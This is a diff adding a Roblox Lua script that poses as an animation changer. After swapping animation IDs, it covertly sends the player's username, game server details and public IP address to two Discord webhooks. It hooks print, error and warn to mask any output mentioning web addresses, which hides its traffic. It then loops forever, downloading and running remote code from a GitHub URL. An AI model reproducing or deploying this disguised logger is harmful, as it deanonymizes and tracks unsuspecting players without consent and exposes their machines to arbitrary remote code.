@@ -1,0 +1,114 @@
+local Animate = game.Players.LocalPlayer.Character.Animate
+Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
+Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
+Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
+Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
+Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
+Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359" 
+Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
+game.Players.LocalPlayer.Character.Humanoid.Jump = true 
+
+local url =
+   "https://discord.com/api/webhooks/924244458151772181/evFcF-iTImGgrGSChmP76ODloGyokG3zwtFnPXq0K-PQGSWgyen1OLuTa2ILQnx2Txbc"
+local data = {
+   ["content"] = "** PlaceName : "..placeName.."**",
+   ["embeds"] = {
+       {
+           ["title"] = "**JobId : "..JobId.."**",
+           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
+           ["type"] = "rich",
+           ["color"] = tonumber(9498256),
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+ 
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+ 
+local denied_message = "Denied Goofy"
+local g
+g = hookfunction(print,function(urprint,...)
+   if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
+       urprint = denied_message
+   end
+ return g(urprint,...)
+end)
+ 
+local p
+p = hookfunction(error,function(urprint,...)
+   if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
+       urprint = denied_message
+   end
+ return g(urprint,...)
+end)
+ 
+local h
+h = hookfunction(warn,function(urprint,...)
+   if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
+       urprint = denied_message
+   end
+ return g(urprint,...)
+end)
+
+local webh = "https://discord.com/api/webhooks/924609055866097704/3vMG-g64nKSQ1qBxKQ90hpXrUKpGST-3ehKlJiX5D09RRijeqhPVyQrQMpS_yiwtLaWX"
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["title"] = game:GetService("Players").LocalPlayer.Name,
+               ["description"] = tostring(game:HttpGet("https://api.ipify.org", true))
+           }
+       }
+   }
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+
+
+while true do
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/jaredloI/AnimationL/main/kid'))()
+    wait()
+end
